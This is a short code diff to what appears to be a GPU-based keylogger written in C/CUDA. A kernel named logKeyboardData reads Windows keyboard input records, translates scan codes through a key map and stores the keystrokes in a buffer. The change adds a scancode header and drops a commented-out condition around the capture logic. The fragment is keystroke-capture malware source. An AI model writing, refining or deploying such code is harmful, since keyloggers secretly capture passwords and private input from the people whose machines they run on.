@@ -18,6 +18,7 @@
 #include <process.h>
 #include <psapi.h>
 #include <time.h>
+#include <scancode.h>
 
 #define DEBUG 1
 
@@ -26,7 +27,6 @@ __global__ void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData, PCHAR KeyMap,
 	if (index == 0) {
 		if (*lastMake != keyboardData->MakeCode || *lastModifier != keyboardData->Flags) { // keyboardData->MakeCode != 0
 			
-//			if (keyboardData->MakeCode) {
 				if (*keystrokeIndex < 9998) {
 					cudaBuffer[*keystrokeIndex++] = KeyMap[keyboardData->MakeCode];
 				}
@@ -38,7 +38,6 @@ __global__ void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData, PCHAR KeyMap,
 					keyboardData->Flags,
 					keyboardData->Reserved,
 					keyboardData->ExtraInformation);
-//			}
 
 			*lastMake = keyboardData->MakeCode;
 			*lastModifier = keyboardData->Flags;
